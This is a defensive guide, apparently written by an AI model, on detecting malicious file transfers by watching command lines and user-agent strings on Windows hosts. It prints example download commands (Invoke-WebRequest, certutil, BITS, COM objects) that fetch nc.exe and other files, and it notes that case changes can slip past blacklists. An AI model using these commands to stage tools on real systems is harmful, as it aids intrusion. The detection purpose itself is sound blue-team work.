
Defenders focus on detecting suspicious or malicious file transfers, even when attackers try to blend in with normal system behavior.

---

## **1. Command-Line Monitoring**

### **Blacklisting**

- ❌ Weak: easy to bypass with obfuscation or case changes (e.g., `InVoKe-WeBReQueST`).
    

### **Whitelisting**

- ✅ Stronger: allows only approved commands or behaviors.
    
- ✅ Works best with **baselining**, learning what’s normal in the environment.
    

---

## **2. User-Agent Strings: Detection Clues**

Most HTTP/HTTPS requests include a **user-agent string** that identifies the tool or script making the request.

### **Detection Best Practices**

- Baseline all **legitimate user agents** used by apps and systems.
    
- Create **alerts for unknown or uncommon agents**.
    
- Use **SIEM/EDR solutions** to enrich logs and analyze behaviors.
    

---

## **3. Tool Detection Signatures**

### **A. PowerShell Web Cmdlets**

**Example Command:**

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

**Server Log User-Agent:**

```
WindowsPowerShell/5.1.14393.0
```

**Detection:** Easily fingerprinted by PowerShell version.

---

### **B. WinHttpRequest COM Object**

**Example Command:**

```powershell
$h = New-Object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://target/file.exe',$false)
$h.send()
```

**Server Log User-Agent:**

```
Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

**Detection:** Outdated, suspicious signature.

---

### **C. Msxml2.XMLHTTP COM Object**

**Example Command:**

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://target/file.exe',$false)
$h.send()
```

**Server Log User-Agent:**

```
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; ...)
```

**Detection:** Mimics old IE versions — rarely legitimate today.

---

### **D. Certutil.exe**

**Example Command:**

```powershell
certutil -urlcache -split -f http://target/nc.exe
```

**Server Log User-Agent:**

```
Microsoft-CryptoAPI/10.0
```

**Detection:** Commonly flagged by modern defenses like AMSI.

---

### **E. BITS Transfer**

**Example Command:**

```powershell
Import-Module bitstransfer
Start-BitsTransfer http://target/nc.exe C:\Temp\nc.exe
```

**Server Log User-Agent:**

```
Microsoft BITS/7.8
```

**Detection:** Blends in with legitimate update traffic — stealthier but still detectable with behavior analysis.

---

## **4. Detection Tips for Blue Teams**

- Build a **baseline of normal user behavior** and known-good processes.
    
- Monitor unusual **command-line arguments** and **user-agent strings**.
    
- Use **behavior-based detection** instead of simple keyword blacklisting.
    
- Correlate logs across systems with SIEM or EDR for better visibility.
    

---

## **Summary**

Malicious file transfers can often be detected by monitoring **command-line usage, network traffic, and user-agent strings**. While attackers use obfuscation and stealth techniques, defenders can counter with:

- **Whitelisting and baselining**
    
- **Behavioral analysis**
    
- **Correlated monitoring** across endpoints and networks.
    

---

Would you like me to turn this into a **quick-reference detection cheat sheet** for blue teams?